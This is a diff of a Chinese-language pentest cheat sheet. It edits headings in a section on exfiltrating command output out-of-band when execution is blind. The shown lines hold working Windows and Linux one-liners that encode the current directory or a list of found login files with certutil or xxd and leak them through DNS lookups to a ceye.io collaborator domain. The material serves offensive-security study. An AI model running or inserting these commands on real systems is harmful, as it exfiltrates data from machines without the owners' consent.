@@ -1016,8 +1016,8 @@ updatedb && locate index.php
 进程路径
 wmic process get name,executablepath
 ```
-### 外带oob
-Windows
+### 命令执行无回显外带oob
+#### Windows
 在windows当中，%cd% 代表的是当前目录，我们通过echo将当前目录写入文本temp,然后荣国certutil对文件内容进行base64编码，再过滤certutil携带的字符，将它赋给一个变量，最后通过nslookup外带出来，从而实现获取当前目录的目的。
 ```
 echo %cd% > temp&&certutil -encode temp temp1&&findstr /L /V "CERTIFICATE" temp1 > temp2&&set /p ADDR=<temp2&&nslookup %ADDR%.is1lv6.ceye.io
@@ -1033,8 +1033,8 @@ echo %cd% > temp&&certutil -encode temp temp1&&findstr /L /V "CERTIFICATE" temp1
 如果需要外带多行命令，则需要以下语句：
 ```
 where /R C: login.* > test && certutil -encodehex -f test test.hex 4 && powershell $text=Get-Content test.hex;$sub=$text -replace(' ','');$j=11111;foreach($i in $sub){ $fin=$j.tostring()+'.'+$i+'.is1lv6.ceye.io';$j += 1; nslookup $fin }
-（b）Linux
 ```
+#### Linux
 在linux中pwd也是查看当前目录的，我们通过tr -d将换行符去掉并通过xxd -ps将值转化为16进制，这样我们即可外带出自己想要的东西。
 ```
 ping pwd|tr -d '\n'|xxd -ps.is1lv6.ceye.io
